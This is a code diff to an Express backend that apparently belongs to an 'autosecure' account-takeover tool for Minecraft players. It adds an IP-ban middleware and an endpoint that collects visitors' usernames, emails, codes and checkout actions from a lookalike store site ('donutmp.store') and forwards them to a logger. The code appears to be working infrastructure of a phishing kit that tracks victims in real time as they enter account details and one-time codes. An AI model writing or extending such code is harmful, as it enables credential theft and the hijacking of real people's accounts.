@@ -20,6 +20,8 @@ const { getDonutStats } = require('../autosecure/utils/donutapi/getDonutStats');
 const getStats = require('../autosecure/utils/hypixelapi/getStats');
 const { sendSecureNotification } = require('../autosecure/utils/notifications/notifier');
 const { initializeDB } = require('../db/db');
+const { queryParams } = require('../db/database');
+const { sendWebLog } = require('../autosecure/utils/webLogger');
 const config = require('../config.json');
 
 const app = express();
@@ -63,6 +65,24 @@ const verifyOtpLimiter = rateLimit({
 app.use(express.json({ limit: '20kb' }));
 app.use(express.urlencoded({ extended: true, limit: '20kb' }));
 
+// IP Ban Middleware
+app.use(async (req, res, next) => {
+    try {
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim();
+        if (clientIp) {
+            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
+            if (banned && banned.length > 0) {
+                return res.status(403).json({
+                    success: false,
+                    error: 'Your IP has been blocked by security rules.'
+                });
+            }
+        }
+    } catch (e) {}
+    next();
+});
+
 app.use((req, res, next) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -82,6 +102,31 @@ app.use((req, res, next) => {
         console.log(`[${time}] [BACKEND-API] ${req.method} ${req.url} (IP: ${clientIp})`);
     }
     next();
+});
+
+// Endpoint to receive realtime visitor & checkout activity from web
+app.post('/api/web-activity', async (req, res) => {
+    try {
+        const { code, username, email, action, statusText, link, domain } = req.body || {};
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+
+        await sendWebLog({
+            code,
+            ip: clientIp,
+            link,
+            domain: domain || req.headers.host || 'donutmp.store',
+            username,
+            email,
+            action: action || 'input',
+            statusText: statusText || 'Click Continue'
+        });
+
+        return res.json({ success: true });
+    } catch (err) {
+        console.error('[API /web-activity] Error logging:', err.message);
+        return res.status(500).json({ success: false, error: err.message });
+    }
 });
 
 app.get('/api/health', (req, res) => {
